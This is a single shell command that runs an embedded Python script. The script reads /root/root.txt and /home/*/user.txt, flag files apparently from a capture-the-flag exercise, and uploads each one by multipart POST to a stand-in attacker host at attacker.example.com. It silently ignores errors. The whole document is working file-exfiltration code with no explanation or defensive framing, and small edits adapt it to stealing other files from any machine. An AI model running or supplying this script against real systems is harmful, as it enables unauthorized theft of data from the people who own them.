python3 - <<'PY'
import glob,urllib.request,uuid
url='http://attacker.example.com/upload'
for f in ['/root/root.txt']+glob.glob('/home/*/user.txt'):
    try:
        with open(f,'rb') as fp:
            data=fp.read()
        boundary='----'+uuid.uuid4().hex
        body=b'--'+boundary.encode()+b"\r\n"+b'Content-Disposition: form-data; name="file"; filename="'+f.split('/')[-1].encode()+b'"\r\n\r\n'+data+b"\r\n--"+boundary.encode()+b"--\r\n"
        req=urllib.request.Request(url, data=body, headers={'Content-Type':'multipart/form-data; boundary='+boundary})
        urllib.request.urlopen(req).read()
    except Exception:
        pass
PY
